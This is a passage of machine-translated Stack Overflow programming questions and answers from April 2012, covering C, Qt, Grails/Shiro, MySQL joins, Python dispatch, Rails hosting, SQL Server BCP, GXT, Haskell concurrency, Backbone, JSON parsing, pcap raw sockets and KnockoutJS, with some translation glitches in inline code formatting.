
一般来说，最好只包含头文件，而不是在其他文件中包含源文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T02:15:59.677

如果我要从头开始写这个（一个有限状态机），我会在里面放以下内容：

fsm.h：

```
struct fsm_rule {
  /* state to which this rule belongs to */
  int state;
  /* new state */
  int next;
  /* is called when rule matches */
  int (*fn)(int in, void *ctx);
};

struct fsm_state {
  int nrules;
  struct fsm_rule *rules;
};

struct fsm {
  int nstates;
  struct fsm_state *states;
}; 
```

然后在里面`fsm.c`我将继续执行所需的方法。

PS：Ofcouse`fsm.c`包括`fsm.h`

# c++ - 使用 NaN 值对 QDoubleSpinBox 进行子类化

> ID：10220607
> 
> 赞同：0
> 
> 时间：2012-04-19T01:54:29.747
> 
> 标签：c++, qt, nan, math.h

我对 QDoubleSpinBox 进行了子类化，以制作一个允许用户输入 NaN 作为有效输入的 QDoubleSpinBox。现在，如果用户在微调框中输入“nan”，则控件会自动将文本更改为 DBL_MAX 的值，而不是保持为 nan。在我开始使用带有 nan 和 isnan 函数的 math.h 库之前，我刚刚将 NAN_VALUE 定义为 1000，范围为 -1000 到 1000。然后在我的 textFromValue 中，我检查了 value 是否等于 NAN_VALUE。同样在 valueFromText 函数中，我返回 NAN_VALUE。当我这样做时，它起作用了，但我希望能够使用 nan 和 isnan 函数。现在我添加了 nan 和 isnan 函数调用它停止工作。有谁知道这是为什么？还，我注意到当我使用 DBL_MIN 和 DBL_MAX 作为范围时，我在早期的实现中遇到了这个问题。这些数字对于控制来说是不是太大了？如果我使范围更小，例如 -1000 和 1000，它工作得很好..

这是我的实现：

CustomDoubleSpinBox.h

```
#ifndef CUSTOMDOUBLESPINBOX_H
#define CUSTOMDOUBLESPINBOX_H

#include <QDoubleSpinBox>
#include <QWidget>
#include <QtGui>
#include <iostream>
#include <math.h>
#include <float.h>
#include <limits>

#define NUMBER_OF_DECIMALS 2

using namespace std;

class CustomDoubleSpinBox : public QDoubleSpinBox
{
    Q_OBJECT

    public:
    CustomDoubleSpinBox(QWidget *parent = 0);
    virtual ~CustomDoubleSpinBox() throw() {}

    double valueFromText(const QString &text) const;
    QString textFromValue(double value) const;
    QValidator::State validate ( QString & input, int & pos ) const;
};

#endif // CUSTOMDOUBLESPINBOX_H 
```

CustomDoubleSpinBox.cpp

```
#include "CustomDoubleSpinBox.h"

CustomDoubleSpinBox::CustomDoubleSpinBox(QWidget *parent) : QDoubleSpinBox(parent)
{
    this->setRange(DBL_MIN, DBL_MAX);
    this->setDecimals(NUMBER_OF_DECIMALS);
}

QString CustomDoubleSpinBox::textFromValue(double value) const
{
    if (isnan(value))
    {
        return QString::fromStdString("NaN");
    }
    else
    {
        QString result;
        return result.setNum(value,'f', NUMBER_OF_DECIMALS);
    }
}

double CustomDoubleSpinBox::valueFromText(const QString &text) const
{
    if (text.toLower() == QString::fromStdString("nan"))
    {
        return nan("");
    }
    else
    {
        return text.toDouble();
    }
}

QValidator::State CustomDoubleSpinBox::validate ( QString & input, int & pos ) const
{
    Q_UNUSED(input);
    Q_UNUSED(pos);

    return QValidator::Acceptable;
} 
```

# grails - 使用 Shiro Grails 插件确定未经授权的请求的 url（或控制器和操作名称）

> ID：10220608
> 
> 赞同：3
> 
> 时间：2012-04-19T01:54:37.783
> 
> 标签：grails, shiro

我希望能够记录我的应用收到的未经授权的请求。因为 Shiro 插件使用 HTTP 重定向将用户发送到`auth/unauthorized`请求对象是一个新的，我无法获得原始 URL；控制器/动作名称；或从中请求参数。

**有没有办法在 AuthController 未经授权的操作中确定原始 url 或控制器和操作名称（如果可能，还可以请求参数）？**

我正在查看[http://plugins.grails.org/grails-shiro/tags/RELEASE_1_1_3/ShiroGrailsPlugin.groovy](http://plugins.grails.org/grails-shiro/tags/RELEASE_1_1_3/ShiroGrailsPlugin.groovy)作为插件源的参考。

详细信息：
Grails 1.3.7
Shiro Grails 插件 1.1.3

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T21:14:10.667

我有同样的问题......我的解决方案并不完美：

浏览器在您可以通过的标题之一中发送所谓的引用者

```
request?.getHeader('Referer') 
```

但是引用者并不是你真正可以依赖的——但大多数浏览器都会发送它。

`accessControl()`另一个解决方案可能是过滤器：在调用之前尝试将当前 url 写入另一个变量`ShiroSecurityFilters.groovy`。您可以通过`request.forwardURI`.

**更新：**刚刚验证了我的最后一个假设 - 这对我来说似乎是最干净的解决方案：

中`ShiroSecurityFilters.groovy`，替换

```
 // Access control by convention.
            accessControl() 
```

和

```
 // Access control by convention.
            if (!accessControl()) {
                session.deniedUrl = request.forwardURI
                return false
            } 
```

`session.deniedUrl`这使您可以像在 auth/unauthorized 控制器中一样访问 url 。

# mysql - 如何从 2 个 mysql 表中查询数据并将结果连接在一起。我的尝试不断给我太多的结果

> ID：10220613
> 
> 赞同：3
> 
> 时间：2012-04-19T01:54:52.447
> 
> 标签：mysql, wordpress, expressionengine

我需要将成员从 ExpressionEngine 移动到 WordPress。到目前为止，我在 Stackoverflow 上得到了以下查询的帮助，该查询效果很好并产生了 696 个结果（正确的成员数量）。但是，我还需要从另一个表中导出一些列，当我将它们添加到查询中时，我得到 484416 个结果（696 x 696）。

这是返回 696 个结果的原始查询：

```
SELECT username AS user_login, 
username AS user_nicename, 
email AS user_email, 
url AS user_url, 
screen_name AS display_name, 
FROM_UNIXTIME(join_date) AS user_registered
FROM exp_members 
```

这是我想做的，我尝试用[Navicat](http://www.navicat.com/)的查询生成器来做。`m_field_id_1`从表中获取调用的列`exp_member_data`并将其返回为`user_location`. 此查询产生 484416 个结果。

```
SELECT exp_members.username AS user_login, 
exp_members.username AS user_nicename, 
exp_members.email AS user_email, 
exp_members.url AS user_url, 
exp_members.screen_name AS display_name, 
FROM_UNIXTIME(join_date) AS user_registered, 
exp_member_data.m_field_id_1 AS user_location // here is the m_field_id_1
FROM exp_members, exp_member_data 
```

如何正确组合这 2 个表，以便仍然只有 696 个返回结果但带有附加列？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:57:45.557

您需要`JOIN`表格之间的条件，或者您得到两者的笛卡尔积（table1 的所有行乘以 table2 的所有行，在这种情况下为 696^2）。

```
SELECT
  exp_members.username AS user_login, 
  exp_members.username AS user_nicename, 
  exp_members.email AS user_email, 
  exp_members.url AS user_url, 
  exp_members.screen_name AS display_name, 
  FROM_UNIXTIME(join_date) AS user_registered, 
  exp_member_data.m_field_id_1 AS user_location
FROM
  exp_members
  JOIN exp_member_data 
    /* ON clause specifies the relation between the two tables */
    ON exp_members.username = exp_member_data.username 
```

以上假设在`exp_member_data`称为`username`映射到的列中有一个`exp_member.username`。如果它们之间有一个 id 列，请使用它，如下所示：

```
 JOIN exp_member_data ON exp_members.member_id = exp_member_data.member_id 
```

# fancybox - Fancybox 的上一个和下一个按钮不出现

> ID：10220618
> 
> 赞同：0
> 
> 时间：2012-04-19T01:55:29.747
> 
> 标签：fancybox

在编辑模板时，我卡在了使用 fancybox 的时候。我注意到没有出现“下一个”和“上一个”按钮。是否有特定的 js 命令可以让它们出现？或者我应该更准确地看哪里？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T02:54:31.187

您必须`rel`在属于同一画廊的所有锚点中设置相同的属性，例如：

```
<a class="fancybox" href="{target 01 here}" rel="gallery">one</a>
<a class="fancybox" href="{target 02 here}" rel="gallery">two</a>
...etc 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T02:41:05.420

没有发布任何代码，我只能猜测可能是什么问题。试试下面两个...

1.  检查您是否已添加`fancybox-buttons.js`到您的页面
2.  确保您将fancybox 附带的图片`next`和图片放到正确的图片目录中。`prev`

希望这可以解决您的问题。如果没有，则通过发布您的代码以获得更多帮助来更新您的问题。

# python - python string to function：globals() vs sys.module vs dictionary

> ID：10220620
> 
> 赞同：1
> 
> 时间：2012-04-19T01:55:44.413
> 
> 标签：python, dictionary, module, global-variables, getattr

我想知道将字符串映射到函数的最佳方法是什么。到目前为止，我知道我可以使用：

1.  全局（）[func_string]
2.  sys.modules[__name__]
3.  funcs_dictionary["func_string" : func]

这是代码：

```
 >>> def foo(arg):
    ...     print "I'm foo: %s" % arg
    ... 
    >>> def bar(arg):
    ...     print "I'm bar: %s" % arg
    ... 
    >>> 
    >>> foo
    <function foo at 0xb742c7d4>
    >>> bar
    <function bar at 0xb742c80c>
    >>> 
```

全局（）[func_string]：

```
 >>> def exec_funcs_globals(funcs_string):
    ...     for func_string in funcs_string:
    ...         func = globals()[func_string]
    ...         func("from globals() %s" % func)
    ... 
    >>> exec_funcs_globals(["foo", "bar"])
    I'm foo: from globals() <function foo at 0xb742c7d4>
    I'm bar: from globals() <function bar at 0xb742c80c>
    >>> 
```

sys.modules[__name__]:

```
 >>> import sys
    >>> 
    >>> def exec_funcs_thismodule(funcs_string):
    ...     thismodule = sys.modules[__name__]
    ...     for func_string in funcs_string:
    ...         func = getattr(thismodule, func_string)
    ...         func("from thismodule %s" % func)
    ... 
    >>> exec_funcs_thismodule(["foo", "bar"])
    I'm foo: from thismodule <function foo at 0xb742c7d4>
    I'm bar: from thismodule <function bar at 0xb742c80c>
    >>> 
```

funcs_dictionary["func_string" : func]:

```
 >>> funcs = {
    ...     "foo" : foo,
    ...     "bar" : bar
    ... }
    >>> 
    >>> def exec_funcs_dict(funcs_string):
    ...     for func_string in funcs_string:
    ...         func = funcs[func_string]
    ...         func("from thismodule %s" % func)
    ... 
    >>> exec_funcs_dict(["foo", "bar"])
    I'm foo: from thismodule <function foo at 0xb742c7d4>
    I'm bar: from thismodule <function bar at 0xb742c80c> 
```

最初我担心 sys.modules[__name__] 会重新加载模块并损害性能。但是上面的代码似乎表明函数指针是相同的，所以我想我不必担心吧？

选项 1、2、3 的最佳用例是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:41:50.927

使用*globals()*是访问（和存储）要全局访问的变量的常规方法。

否则，通常的选择是实现调度字典（如您的选项 3）。

我还没有看到在任何地方使用过*sys.modules*方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-04-22T20:14:26.667

我只是一个新手 Python 编码器（< 6 个月），但要直接回答您的问题，在我看来，如果您正在寻找最灵活的解决方案， **sys.modules是“最佳”解决方案。**原因如下：

1.  当数据已经存在并且可以使用**globals()**和**sys.modules**方法访问时，手动创建**新字典似乎是浪费精力。**
*****   **globals()**和**sys.modules**方法还允许您自动和动态地农场（然后过滤）函数列表 - 如果您像我一样尝试从代码中定义的所有函数自动构建 GUI/菜单，这很有用。*   **globals()**的一个考虑因素是，如果您从另一个模块导入并调用“function farmer”，您将只能获得“function farmer”模块本身的功能，而不是父模块。[可能有一个解决方案......我在[这里](https://stackoverflow.com/questions/49971629/getting-function-objects-from-globals-and-locals-across-different-modules)发布了一个单独的问题，如果我听到任何有用的回复，我会更新这个回复。]*   另一方面，使用**sys.modules ，您可以调用“function farmer”并获取 '__ main __' 模块的功能。******

# ruby-on-rails - 设置 Webrick 以连接到我的 rails 应用程序

> ID：10220621
> 
> 赞同：0
> 
> 时间：2012-04-19T01:55:47.473
> 
> 标签：ruby-on-rails, webrick

我尝试在 Ubuntu 的计算机上托管我的 ruby​​ on rails 应用程序，但我无法获得它。我尝试从我的路由器设置进行端口转发。我想我成功地转发了源端口 80 - 8080 和目标端口 3000 的端口。然后我在生产模式下启动 webrick。但是，我无法通过输入外部 IP 从 Internet 打开我的应用程序。如何正确设置我的计算机？你有什么建议吗？

谢谢...

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-19T02:07:50.520

Try the following to help debug the issue:

1.  From the same machine (you can use curl in place of wget if you'd like, as it's more powerful), make sure rails is running

    $ wget [http://localhost:3000](http://localhost:3000)

2.  From the same machine, make sure the server is bound to an external ip address

    $ ifconfig (lists the ip address a.b.c.d)

    $ wget [http://a.b.c.d:3000](http://a.b.c.d:3000)

3.  From another machine on the same network, make sure you request the web page

    $ wget [http://a.b.c.d:3000](http://a.b.c.d:3000)

If the first step fails, rails might not be running. If the second step fails, then you might have an issue with how networking is setup, but you can try `rails server -b a.b.c.d` to see if that fixes it. If the last step fails, then you have an issue with your local network. Finally, if they all succeed, then the issue is either with your ISP or with your router.

# sql-server - 在 BCP 中遇到错误。由于预登录失败，客户端无法建立连接

> ID：10220622
> 
> 赞同：0
> 
> 时间：2012-04-19T01:56:08.330
> 
> 标签：sql-server

我们进入 SQL Server 2008R2。
我收到以下错误：

```
SQLState = 08001, NativeError = 0
Error = [Microsoft][SQL Server Native Client 10.0]Client unable to establish connection due to prelogin failure. 
```

使用以下脚本：

```
DECLARE @cmd VARCHAR(200)  
BEGIN 
    set @cmd = 'bcp.exe "' + 'SELECT 1111' + '" queryout ' + '"' + 'C:\ePay\test.txt' + '"' + ' -S ' + 'HOEXDB01\XPDBPRD1\' + ' -c -q -C1252 -t , -U ' + 'usr_apps_tst' + ' -P ' + 'test1234$$'
    print @cmd
    execute xp_cmdshell @cmd
end 
```

感谢并感谢任何帮助
Elmer

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T03:50:58.927

尝试改变

`+ 'HOEXDB01\XPDBPRD1\' +`

至

`+ 'HOEXDB01\XPDBPRD1' +`

# gwt - GXT：LayoutContainer 不响应 ESC 键或“X”按钮关闭

> ID：10220627
> 
> 赞同：0
> 
> 时间：2012-04-19T01:56:46.043
> 
> 标签：gwt, gxt

我有一个 GXT 2.x 应用程序，它带有一个呈现单独 LayoutContainer 的菜单栏项。

这是层次结构 MainUI.java -> MenuBar.java -> ReservationPopUp.java

我已经用 LayoutContainer 实现的已知工作示例替换了我的 ReservationPopUp.java 内容，它们响应 ESC 键和“X”按钮。

这是 MenuItem 如何呈现 ReservationPopUp.java

```
MenuItem mntmReserve = new MenuItem("Reserve"); 
mntmReserve.addSelectionListener(new SelectionListener<MenuEvent>() {
    public void componentSelected(MenuEvent ce) {
        RootPanel.get().add(new ReservationPopUp());

} 
```

这是我的 ReservationPopUp.java 的精简版

```
public class ReservationPopUp extends LayoutContainer  {
public ReservationPopUp() {
}

@Override  
  protected void onRender(Element parent, int pos) {  

    super.onRender(parent, pos);
    setSize("1024", "809");
    final Window window = new Window();
    window.setDraggable(false);
    window.setSize(537, 399);  
    window.setPlain(true);  
    window.setModal(true);  
    window.setBlinkModal(true);  
    window.setHeading("Reserve A Server");
    window.setClosable(true);
    window.setOnEsc(true);
    window.setSize("465", "345");
    window.setLayout(new AbsoluteLayout());

    LabelField lblfldUsers = new LabelField("Users");
    window.add(lblfldUsers, new AbsoluteData(43, 218));
    final ComboBox<AsyncUser> userList = new ComboBox<AsyncUser>();

    window.add(userList, new AbsoluteData(81, 218));
    userList.setEmptyText("Select a User...");
    userList.setSize("347px", "24px");

    LabelField labelServers = new LabelField("Servers");
    window.add(labelServers, new AbsoluteData(32, 6));

    final DualListField<AsyncServer> serverList = new DualListField<AsyncServer>();  
        ....
    window.add(serverList, new AbsoluteData(81, 6));
    serverList.setSize("347px", "206px");

    window.addButton(new Button("Cancel", new SelectionListener<ButtonEvent>() {  
          @Override  
          public void componentSelected(ButtonEvent ce) {  
            ReservationPopUp.this.hide();  
          }  
    }));

    window.addButton(new Button("Reserve", new SelectionListener<ButtonEvent>() {  
          @Override  
          public void componentSelected(ButtonEvent ce) {
            if (serverList.getToList().getListView().getItemCount() == 0 ) {
                MessageBox.alert("Invalid Selection","No Server(s) Selected", null);
            } else if ( userList.getValue() == null) {

            } else {
                // DO some stuff
                ReservationPopUp.this.hide();  
            }
          }  
        }));

    window.addWindowListener(new WindowListener() {  
        @Override  
        public void windowHide(WindowEvent we) {
            ReservationPopUp.this.hide();
        }  
      }); 
    window.setFocusWidget(window.getButtonBar().getItem(0));
    add(window);

} 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T03:05:47.813

`Window`是一个弹出窗口，它不需要（也不应该）添加到任何东西。扩展`Window`类而不是`LayoutContainer`，而不是添加`ReservationPopup`到页面，只需调用`Window.show()`.

# performance - Haskell：并发数据结构指南

> ID：10220629
> 
> 赞同：7
> 
> 时间：2012-04-19T01:56:52.627
> 
> 标签：performance, haskell, concurrency, ioref

我一直在尝试理解并发，并且一直在尝试找出更好的方法，一个大`IORef`锁或多个`TVar`s。我已经得出以下指导方针，我们将不胜感激，关于这些是否大致正确或我是否错过了重点。

* * *

让我们假设我们的并发数据结构是一个映射`m`，像 一样访问`m[i]`。还可以说我们有两个函数，`f_easy`并且`f_hard`. `f_easy`速度很快，需要`f_hard`很长时间。我们将假设 的参数`f_easy/f_hard`是 的元素`m`。

(1) 如果您的交易大致如下所示`m[f_easy(...)] = f_hard(...)`，请使用`IORef`with `atomicModifyIORef`。懒惰将确保`m`它只被锁定很短的时间，因为它是用一个 thunk 更新的。计算索引有效地锁定了结构（因为有些东西会被更新，但我们还不知道是什么），但是一旦知道那个元素是什么，整个结构上的 thunk 就会移动到仅在那个特定元素上的 thunk ，然后只有那个特定的元素被“锁定”。

(2) 如果你的交易看起来大致是这样`m[f_hard(...)] = f_easy(...)`的，并且不要冲突太多，使用很多`TVar`s。在这种情况下使用 an`IORef`将有效地使应用程序成为单线程，因为您不能同时计算两个索引（因为整个结构上会有一个未解决的 thunk）。`TVar`s 让你同时计算出两个索引，但是，不利的是，如果两个并发事务都访问同一个元素，并且其中一个是写入，则必须废弃一个事务，这会浪费时间（本来可以在别处使用）。如果这种情况经常发生，你可能会更好地使用来自 （通过黑洞）的锁`IORef`，但如果它不经常发生，你将获得更好的`TVar`s 并行性。

基本上在情况（2）中，`IORef`您可能会获得 100% 的效率（没有浪费的工作）但只使用 1.1 个线程，但`TVar`如果您的冲突数量较少，您可能会获得 80% 的效率但使用 10 个线程，所以您仍然结束即使浪费了工作，速度也提高了 7 倍。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T02:45:29.707

您的指导方针有点类似于 [1]（第 6 节）的结果，其中分析了 Haskell STM 的性能：

> “特别是对于那些在事务内部不执行太多工作的程序，提交开销似乎非常高。为了进一步观察这种开销，需要对提交时粗粒度和细粒度的性能进行分析STM 锁定机制。”

我使用`atomicModifyIORef`或`MVar`当我需要的所有同步都是简单锁定将确保的东西。在查看对数据结构的并发访问时，还取决于该数据结构的实现方式。例如，如果您将数据存储在 a 中`IORef Data.Map`并经常执行读/写访问，那么我认为`atmoicModifyIORef`会降级为单线程性能，正如您所猜想的那样，但对于 a 也是如此`TVar Data.Map`。我的观点是使用适合并发编程的数据结构很重要（平衡树不是）。

也就是说，在我看来，使用 STM 的获胜论点是*可组合性*：您可以将多个操作组合成一个事务而不会令人头疼。`IORef`通常，无论`MVar`是否引入新锁 ，这都是不可能的。

[1] 软件事务内存 (STM) 的限制：在多核环境中剖析 Haskell STM 应用程序。 [http://dx.doi.org/10.1145/1366230.1366241](http://dx.doi.org/10.1145/1366230.1366241)

**回答@Clinton 的评论：**

如果*单个* `IORef`包含您的*所有*数据，您可以简单地`atomicModifyIORef`用于组合。但是，如果您需要处理对该数据的大量并行读/写请求，则性能损失可能会变得很大，因为对该数据的*每一*对并行读/写请求都可能导致冲突。

我会尝试的方法是使用数据结构，其中条目本身存储在 a 中`TVar`（而不是将整个数据结构放入单个`TVar`）。这应该会减少活锁的可能性，因为事务不会经常发生冲突。

当然，您仍然希望使您的事务尽可能小，并且仅在绝对有必要保证一致性时才使用可组合性。到目前为止，我还没有遇到过需要将多个插入/查找操作组合到单个事务中的情况。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T02:39:53.880

除了性能之外，我认为使用`TVar`类型系统还有一个更根本的原因，可以确保您不会执行任何“不安全”操作，例如`readIORef`or `writeIORef`。共享您的数据是类型的属性，而不是实现的属性。编辑：`unsafePerformIO`总是不安全的。 `readIORef`仅当您还使用`atomicModifyIORef`. 至少将您的 IORef 包装在一个新类型中，并且只公开一个包装好的`atomicModifyIORef`

除此之外，不要使用`IORef`，使用`MVar`或`TVar`

1.  您描述的第一个使用模式可能没有很好的性能特征。您可能最终（几乎）完全是单线程的——由于懒惰，每次更新共享状态时都不会发生实际工作，但是每当您需要使用此共享状态时，都需要强制执行整个累积的 thunk 堆，并且具有线性数据依赖结构。
2.  拥有 80% 的效率但显着更高的并行度允许您利用不断增长的内核数量。您可以期望在未来几年对单线程代码的性能改进最少。
3.  许多词 CAS 可能会以“硬件事务内存”的形式出现在您附近的处理器中，从而使 STM 变得更加高效。
4.  您的代码将更加模块化——当您的设计在单个引用后面具有所有共享状态时，如果您添加更多共享状态，则必须更改每段代码。 `TVars`并且在较小程度上`MVars`支持自然模块化。

# backbone.js - 如何从集合中获取自构建以来发生变化的模型列表

> ID：10220631
> 
> 赞同：1
> 
> 时间：2012-04-19T01:56:53.897
> 
> 标签：backbone.js, backbone.js-collections

如果我在初始化对话框视图时使用模型属性的对象数组初始化集合。然后，允许用户编辑列表的对话框视图通过调用模型集来更新这些模型值。当单击对话框的确定​​按钮时，主干是否提供了一种方法来获取自集合创建/初始化以来更改的模型列表？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T03:13:40.837

有多种模型方法看起来很诱人：

*   [`Model#hasChanged`](http://documentcloud.github.com/backbone/#Model-hasChanged)
*   [`Model#changedAttributes`](http://documentcloud.github.com/backbone/#Model-changedAttributes)
*   [`Model#previous`](http://documentcloud.github.com/backbone/#Model-previous)
*   [`Model#previousAttributes`](http://documentcloud.github.com/backbone/#Model-previousAttributes)

但不要上当，这些仅`"change"`在触发事件时适用：

> [请注意，此方法以及以下与更改相关的方法仅在事件过程中有用`"change"`。](http://documentcloud.github.com/backbone/#Model-hasChanged)

所以在事件被触发和处理后它们就没有用了。

我认为您必须跟踪哪些模型已经改变了自己。您可以在集合本身上执行此操作而无需太多努力，因为

> [为方便起见，在集合中的模型上触发的任何事件也将直接在集合上触发。](http://documentcloud.github.com/backbone/#Collection)

并且集合可以绑定到它自己的事件。例如，您的收藏中可能有这样的东西：

```
Backbone.Collection.extend({
    initialize: function() {
        this.delta = { };
        this.on('change',​​​​​ this._a_model_has_changed);
    },
    changed_models: function() {
        return _.chain(this.delta).values();
    },
    _a_model_has_changed: function(m) {
        this.delta[m.id] = m;
    }
}); 
```

然后你可以通过调用`collection.changed_models()`. 您还想监听其他事件，以便在模型被删除或与服务器同步时更新 this.delta；以上仅用于说明。如果您不希望返回 Underscore 对象，则可以改用它：

```
changed_models: function() {
    return _(this.delta).values();
} 
```

但能够`collection.changed_models().each(function() { ... })`很方便。

演示：http: [//jsfiddle.net/ambiguous/8PQh9/](http://jsfiddle.net/ambiguous/8PQh9/)

您还可以让模型通过模型上的类似设置来跟踪自己的肮脏程度。然后你可以做这样的事情：

```
collection.filter(function(m) { return m.is_dirty() }); 
```

当然，`is_dirty`如果模型已更改，其中将返回 true。

# asp.net - ASP.net（背后的 VB 代码）JSON 解析 facebook Graph API 响应

> ID：10220632
> 
> 赞同：1
> 
> 时间：2012-04-19T01:56:57.520
> 
> 标签：asp.net, vb.net, facebook, json, facebook-graph-api

net 但想尝试在 ASP.net 中而不是我的普通经典 ASP 中执行此代码。

我一直在尝试查找代码示例，这些示例将向我展示如何解析从 facebook API Graph 调用返回的 JSON 中的名称和 ID。来自 Facebook 的 JSON 返回如下所示：

```
{
  "data": [
    {
      "name": "David xxxxxx", 
      "id": "05121212", 
      "administrator": true
    }, 
    {
      "name": "Billy xxxxxxx", 
      "id": "0005128888"
    }
  ], 
  "paging": {
    "next": "https://graph.facebook.com/xxxxx/members?format=json&limit=5000&offset=5000&__after_id=xxxxx"
  }
} 
```

任何关于如何从 ASP.net 中的 JSON 响应中解析出名称和 ID 的示例都很棒！

谢谢，

大卫

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T03:40:05.820

无论是否存在 .NET 和 Open Graph 的已知库，Json 就是 Json。在我看来，你有三个选择：

1）使用Newtonsoft Json。您可以使用 nuget 将这个包安装到您的 ASP.NET 项目中，并且网上有很多地方都在讨论如何使用这个库。 [http://james.newtonking.com/](http://james.newtonking.com/)是图书馆的主页，这里也有帖子。

2）使用.NET Json。同样，这里有很多网络上的信息。我在这里找到了一个非常好看的帖子[Parse JSON in C#](https://stackoverflow.com/questions/1212344/parse-json-in-c-sharp)

3) 使用 C# Facebook SDK。FacebookClient 类具有序列化和反序列化 Json 的能力。你也可以通过 Nuget 安装这个库。我承认缺少关于 C# SDK 的文档，但它仍然运行良好。关于它的更多信息可以在这里找到：http: [//blog.prabir.me/category/Facebook-C-SDK.aspx](http://blog.prabir.me/category/Facebook-C-SDK.aspx)

我希望这可以帮助您走上正确的道路。

-埃里克

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T04:04:57.410

去吧，[http://james.newtonking.com/](http://james.newtonking.com/)

```
string response = <your fb data>;   // I am lazy :P
JObject obj = JObject.Parse(response);
JArray data = (JArray)obj["data"];
for(int i=0,int len=data.count; i < len ; i++)
{
 string name = data[i]["name"].ToString();
 string id = data[i]["id"].ToString();
 string administrator = string.Empty;
 if(data[i]["administrator"]!=null)
 {
   string administrator = data[i]["administrator"].ToString();
 }

} 
```

我认为，这段代码足以让你继续前进。始终检查 null，因为 api 数据可能具有也可能没有该值。

编辑：我注意到你想要一个 VB 代码，抱歉。但它可能会帮助其他人，所以把它留在这里。您可以将代码从任何 C# 转换为 VB 转换器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T03:04:10.327

对于新的图形 api，没有已知的 .net 支持库。 [https://github.com/facebook-csharp-sdk](https://github.com/facebook-csharp-sdk) 有一些使用 .net 的示例。

# linux - pcap 如何同时处理多个协议

> ID：10220634
> 
> 赞同：1
> 
> 时间：2012-04-19T01:57:00.677
> 
> 标签：linux, sockets, pcap, packet-sniffers

API的文档`int socket(int domain, int type, int protocol);`说，如果给定*域*存在多个协议，则该*协议*指定一个特定协议。这似乎意味着对于给定套接字的给定域只能指定一个协议。

 *我在 Linux 中试验原始套接字，但后来我偶然发现了这个*协议*。我知道 pcap 库可用于捕获任何协议的数据包。我使用 pcap 编写了一个 Q&D 程序，我注意到`if_ether.h`文件中定义的大多数常见协议都被捕获。

所以目前在我的程序中，我只能指定要捕获的一种类型的数据包。有没有办法使用标准 Linux 头文件和库来复制 pcap 行为？pcap 如何实现这一点？我试图用谷歌搜索这个问题，但我认为我的查询格式不正确，因为我得到的结果没有多大用处。

我不想在这里解决任何问题，只是学习这个概念。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T07:03:57.963

在 Linux 上，使用 2.0 或更高版本的内核，libpcap 在一个套接字上捕获`domain`is `PF_PACKET`、`type`is`SOCK_RAW`或`SOCK_DGRAM`、 and `protocol`is `htons(ETH_P_ALL)`。

`SOCK_RAW`对于大多数网络接口，将为您提供带有链路层标头的数据包；对于其他一些接口，比如 PPP 接口，它会给你*没有*链路层报头的数据包，这使得很难确定在链路层协议之上运行的是什么协议。

`SOCK_DGRAM`将为您提供没有链路层标头但带有一些附加信息的数据包；libpcap 使用该信息生成[一个虚假的链路层标头](http://www.tcpdump.org/linktypes/LINKTYPE_LINUX_SLL.html)。您必须编写自己的代码来处理这些附加信息。

有关更多信息，请参见[Linux packet(7) 手册页](http://www.linuxmanpages.com/man7/packet.7.php)。*

# jquery - knockoutjs - observableArray 具有可查看可观察值的对象

> ID：10220637
> 
> 赞同：2
> 
> 时间：2012-04-19T01:57:31.993
> 
> 标签：jquery, knockout.js

我正在使用 KnockoutJS 编写一个小型应用程序，用户可以通过在输入字段中输入文本来编辑“产品”，该输入字段将自动更新图像顶部的可查看文本框。这允许用户在购买例如牌匾之前预览可雕刻的线条。

所以这是我的问题：

我有一个包含 observableArray （product.lines）的对象（产品）：

```
self.product = ko.utils.arrayMap(jsonData, function(data) {
    return new CustomizableProduct(
    data.sku, data.name, data.lines, data.fonts, data.plates)
});
function CustomizableProduct(sku, name, lines, fonts, plates) {
  return {
    sku: ko.observable(sku),
    name: ko.observable(name),
    lines: ko.observableArray(lines),
    fonts: ko.observableArray(fonts),
    plates: ko.observableArray(plates)
  }
} 
```

json数据：

```
var initialData = [
{
"sku": "PMW",
"name": "Premium Genuine Walnut Step Edge Plaque",
"plates": [
    {
    "sku": "plateSKU",
    "name": "plateName",
    "img": "/images/plates/plateSKU.jpg"},
{
    "sku": "plateSKU2",
    "name": "plateName2",
    "img": "/images/plates/plateSKU.jpg"}
],
"lines": [
    {
    "label": "Line 1",
    "value": "Line 1",
    "type": "input",
    "characterLimit": "146"},
{
    "label": "Line 2",
    "value": "Line 2",
    "type": "input",
    "characterLimit": "156"},
{
    "label": "Line 3",
    "value": "Line 3",
    "type": "submit",
    "characterLimit": "176"}
],
"fonts": [
    {
    "font": "Times New Roman"}
]}
]; 
```

product.lines 被循环并使用从对象设置的默认值创建输入框（值：$data.value）。这些输入框可由用户编辑。我还需要将输入框的值显示为更新后的类型，以作为输入内容的预览。当我输入一个新单词时，它会在对象中更新，但需要显示该值的字段不会更新。

我在这里有我的代码的 jsFiddle：http: [//jsfiddle.net/pR6xp/2/](http://jsfiddle.net/pR6xp/2/)

当通过编辑输入字段进行更新时，我需要写什么来更新该值？

谢谢..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T03:09:25.273

您创建了一个 observableArray 行，但是当将对象添加到 observableArray 时，它们的属性不会变为可观察的，这由您来实现。

我添加了一个具有可观察值的 ProductLine 对象，并使用这些对象初始化了行集合。

[http://jsfiddle.net/vRBhP/1/](http://jsfiddle.net/vRBhP/1/)

希望这可以帮助。

# r - 计算大型数据集的欧几里得距离

> ID：10220640
> 
> 赞同：3
> 
> 时间：2012-04-19T01:58:07.547
> 
> 标签：r, distance

